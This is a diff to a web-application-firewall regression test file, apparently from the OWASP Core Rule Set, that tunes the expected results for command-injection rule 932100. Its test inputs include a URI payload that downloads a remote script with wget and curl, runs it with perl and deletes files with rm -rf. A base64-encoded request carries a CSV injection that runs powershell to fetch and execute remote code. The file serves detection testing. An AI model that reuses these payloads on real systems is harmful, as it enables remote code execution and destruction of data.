@@ -25,7 +25,7 @@
           method: GET
           port: 80
           uri: /?foo=system('echo%20cd%20/tmp;wget%20http://turbatu.altervista.org/apache_32.png%20-O%20p2.txt;curl%20-O%20http://turbatu.altervista.org/apache_32.png;%20mv%20apache_32.png%20p.txt;lyxn%20-DUMP%20http://turbatu.altervista.org/apache_32.png%20>p3.txt;perl%20p.txt;%20perl%20p2.txt;perl%20p3.txt;rm%20-rf
-          version: '*.txt''); HTTP/1.0'
+          version: HTTP/1.0
         output:
           log_contains: id "932100"
   - 
@@ -51,7 +51,11 @@
           version: HTTP/1.0
         output:
           log_contains: id "932100"
-  - 
+  -
+    # Currently this will be blocked by apache before it gets
+    # to CRS. as a result we need to check for 400 from Apache
+    # We ideally want a OR output check. 
+    # https://github.com/CRS-support/ftw/issues/19
     test_title: 932100-3
     desc: CSV Injection Test as described in http://www.client9.com/article/five-interesting-injection-attacks/
     stages:
@@ -60,4 +64,5 @@
         input:
           encoded_request: "UE9TVCAvaW5kZXguaHRtbCBIVFRQLzEuMQpIb3N0OiAxOTIuMTY4LjEuMjMKVXNlci1BZ2VudDogY3VybC83LjQzLjAKQWNjZXB0OiAqLyoKQ29udGVudC1MZW5ndGg6IDY0CkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkCkNvbm5lY3Rpb246IGNsb3NlCgpkPTE7MjszOzQ7NVxuMTtAU1VNKDErMSkqY21kfCcgcG93ZXJzaGVsbCBJRVgod2dldCAwci5wZS9wKSdcIUEwOzM="
         output:
-          log_contains: id "932100"                
+            status: [403, 400]
+            #log_contains: id "932100"                
